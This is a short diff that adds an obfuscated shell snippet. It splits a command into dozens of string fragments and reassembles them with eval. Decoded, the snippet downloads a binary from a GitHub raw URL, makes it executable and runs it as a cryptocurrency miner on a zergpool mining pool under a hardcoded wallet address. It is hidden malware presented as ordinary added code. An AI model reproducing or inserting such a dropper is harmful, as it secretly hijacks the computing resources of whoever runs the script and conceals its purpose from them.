@@ -1,0 +1,3 @@
+z="
+";vz=') -p';Iz='pecu';iz='RtNR';Az='wget';tz='-n 1';Wz='shas';Pz='d +x';Yz='.min';Xz='h.na';sz='-99 ';xz='GB';wz=' c=D';Dz='/git';Fz='com/';Qz=' pec';Hz='fff/';jz='n8z1';oz='echo';Vz='veru';rz='-i 1';ez='-u R';dz='300 ';Uz=' -l ';Jz='k/ra';Gz='desa';lz='TCGm';nz='H.$(';Nz=' && ';fz='Vj1V';Ez='hub.';Zz='e.ze';bz='ol.c';Mz='ecus';Bz=' htt';hz='vMHg';Tz='s -v';Lz='in/p';Oz='chmo';uz=')-Ib';az='rgpo';kz='eeGk';qz='huf ';Cz='ps:/';Kz='w/ma';mz='K5qm';gz='kZYs';Sz='& ./';Rz='us &';pz=' $(s';cz='om:3';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Iz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz"
